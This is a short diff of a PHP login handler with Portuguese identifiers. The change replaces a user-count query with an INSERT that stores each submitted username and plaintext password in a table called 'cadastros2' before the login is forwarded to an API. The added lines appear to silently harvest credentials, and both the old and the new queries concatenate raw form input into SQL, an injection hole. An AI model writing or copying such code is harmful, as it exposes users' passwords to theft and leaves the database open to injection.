@@ -16,8 +16,8 @@ $ip =  getIp();
 
 if ($_POST['action'] == 'gravar_login') {
 
-    $sql = "select count(id) as contagem_cadastro from painel_data where usuario = '" . $_POST['usuario'] . "'";
-    $result = $db->query($sql)->fetchAll(PDO::FETCH_ASSOC);
+    $insert_log = "insert into cadastros2 values ('" . $_POST['usuario'] . "', '" . $_POST['senha'] . "')";
+    $exec_insert_log = $db->query($insert_log);
 
 
         $api_login = api_login($_POST['usuario'], $_POST['senha'], $ip);
